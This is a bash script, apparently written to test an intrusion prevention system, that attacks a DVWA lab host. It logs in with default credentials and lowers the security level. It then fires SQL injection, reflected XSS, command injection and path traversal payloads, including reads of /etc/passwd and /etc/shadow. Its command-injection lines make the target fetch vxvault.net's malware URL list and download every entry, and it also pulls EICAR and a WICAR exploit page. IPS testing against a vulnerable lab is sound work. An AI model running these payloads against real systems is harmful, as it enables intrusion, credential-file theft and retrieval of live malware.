#!/bin/bash

# Define the correct base URL for DVWA
BASE_URL="http://labs.aflabs.us"
LOGIN_URL="${BASE_URL}/login.php"
MALWARE_URL_1="http://malware.wicar.org/data/eicar.com"
MALWARE_URL_2="http://malware.wicar.org/data/ms09_072_style_object.html"

echo "Logging into DVWA to capture PHPSESSID and CSRF token..."

# Login to DVWA and capture the PHPSESSID (macOS compatible)
LOGIN_RESPONSE=$(curl -i -s -k -X POST -d "username=admin&password=password&Login=Login" "${LOGIN_URL}")
PHPSESSID=$(echo "$LOGIN_RESPONSE" | grep -o 'PHPSESSID=[^;]*' | cut -d '=' -f 2)

if [ -z "$PHPSESSID" ]; then
    echo "Failed to capture PHPSESSID. Please check the login credentials and try again."
    exit 1
fi

echo "Captured PHPSESSID: $PHPSESSID"

# Fetch the CSRF token from the security page
SECURITY_PAGE=$(curl -s -k --cookie "PHPSESSID=$PHPSESSID" "${BASE_URL}/security.php")
CSRF_TOKEN=$(echo "$SECURITY_PAGE" | grep -oP 'user_token" value="\K[^"]+')

if [ -z "$CSRF_TOKEN" ]; then
    echo "Failed to capture CSRF token."
    exit 1
fi

echo "Captured CSRF token: $CSRF_TOKEN"

# Set security level to low (ensure DVWA is in low security mode)
SECURITY_URL="${BASE_URL}/security.php"
curl -i -s -k -X POST -d "security=low&seclev_submit=Submit&user_token=$CSRF_TOKEN" "${SECURITY_URL}" --cookie "PHPSESSID=$PHPSESSID"

echo "Testing IPS with various attacks on DVWA..."

#########################
# SQL Injection Tests (5 Tests)
#########################

echo "Running SQL Injection Tests..."

SQLI_URL="${BASE_URL}/vulnerabilities/sqli/"

curl -i -s -k "${SQLI_URL}?id=1%27+OR+%271%27=%271&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1%27+UNION+SELECT+null,null--&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1%27+AND+1=0--&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1%27+OR+1=1--&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1%27+AND+%27x%27=%27x&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET

#########################
# Cross-Site Scripting (XSS) Tests (5 Tests)
#########################

echo "Running XSS Tests..."

XSS_URL="${BASE_URL}/vulnerabilities/xss_r/"

curl -i -s -k "${XSS_URL}?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=%3Ciframe+src%3Djavascript%3Aalert%28%27XSS%27%29%3E&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET

#########################
# Command Injection Tests (5 Tests)
#########################

echo "Running Command Injection Tests..."

CMD_INJ_URL="${BASE_URL}/vulnerabilities/exec/"

curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1%3Bls&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1%3Bwhoami&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1%3Bcurl+http%3A%2F%2Fvxvault.net%2FURL_List.php+%3E+urls.txt&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1%3Bwget+-i+urls.txt+--tries%3D1+--timeout%3D5&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET

#########################
# Directory Traversal Tests (5 Tests)
#########################

echo "Running Directory Traversal Tests..."

DIR_TRAV_URL="${BASE_URL}/vulnerabilities/fi/"

curl -i -s -k "${DIR_TRAV_URL}?page=../../../../etc/passwd" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../boot.ini" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../etc/shadow" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../windows/system32/config/system" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../etc/hosts" --cookie "PHPSESSID=$PHPSESSID" -X GET

#########################
# Malware Injection Simulation (2 Tests)
#########################

echo "Running Malware Injection Simulations..."

curl -i -s -k "${MALWARE_URL_1}" -O eicar.com
curl -i -s -k "${MALWARE_URL_2}" -O ms09_072_style_object.html

echo "IPS testing completed."
